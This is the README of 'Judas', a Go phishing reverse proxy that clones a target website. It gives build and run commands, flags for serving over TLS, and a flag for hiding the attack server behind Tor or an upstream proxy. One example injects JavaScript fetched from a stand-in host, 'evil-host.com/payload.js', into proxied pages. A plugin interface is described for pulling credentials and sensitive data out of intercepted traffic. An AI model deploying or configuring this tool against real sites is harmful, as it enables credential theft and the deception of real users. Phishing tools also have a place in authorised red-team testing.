Judas
=====
Judas is a phishing proxy.
It can clone a website passed to it using command line flags.

Building
--------
To build `judas`, simply run `go build`.
 ```
 go build -o judas cmd/judas.go
 ```


Usage
-----
The target ```--target``` flag is required.
`judas` will use Let's Encrypt to automatically create SSL certificates for website.
If you want to listen using HTTP, pass the ```--insecure``` flag.
If you want to accept self-signed SSL certificate from target host, pass the ```--insecure-target``` flag.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key
```

```
./judas --target https://target-url.com --insecure
```

```
./judas --target https://target-url-with-self-signed-cert.com --insecure-target
```


It can optionally use an upstream proxy with the ```--proxy``` argument to proxy Tor websites or hide the attack server from the target.

Example:
```
./judas --target https://torwebsite.onion --cert server.crt --private-key server.key --proxy socks5://localhost:9150
```

By default, Judas listens on localhost:8080.
To change this, use the ```--address``` argument.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key --address=0.0.0.0:8080
```

Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key --inject-js https://evil-host.com/payload.js
```

Plugins
-------
Judas can be extended using [Go plugins](https://golang.org/pkg/plugin/). 
An `judas` plugin is a regular Go plugin with a function called `New` that implements `judas.InitializerFunc`.
You can use plugins to save request-response transactions to disk for further analysis, or pull credentials and sensitive information out of requests and responses on the fly.

```
// InitializerFunc is a go function that should be exported by a function package.
// It should be named "New".
// Your InitializerFunc should return an instance of your Plugin with a reference to judas's logger for consistent logging.
type InitializerFunc func(*log.Logger) (Plugin, error)
```

The `judas.Plugin` interface has one method: `Listen`.

```
// Plugin must be implemented by a plugin to users to hook the request - response transaction.
// The Listen method will be run in its own goroutine, so plugins cannot block the rest of the program, however panics can take down the entire process.
type Plugin interface {
	Listen(results <-chan *Result)
}
```

`Listen` implementations will receive a stream of  `judas.HTTPExchange`.
These contain the `judas.Request`, the payload and the `judas.Response`, along with the target.

```
// HTTPExchange contains the request sent by the user to us and the response received from the target server.
// Plugins can use this struct to pull information out of requests and responses.
type HTTPExchange struct {
	Request  *Request
	Response *Response
	Target   *url.URL
}
```

You can put plugins in a directory and pass them with the `--plugins-dir` flag.
By default it's `./plugins`.

See [examples/searchloggingplugin/searchloggingplugin.go](https://github.com/JonCooperWorks/judas/tree/master/examples/searchloggingplugin/searchloggingplugin.go)

You can build a plugin using this command:
```
go build -buildmode=plugin path/to/plugin.go
```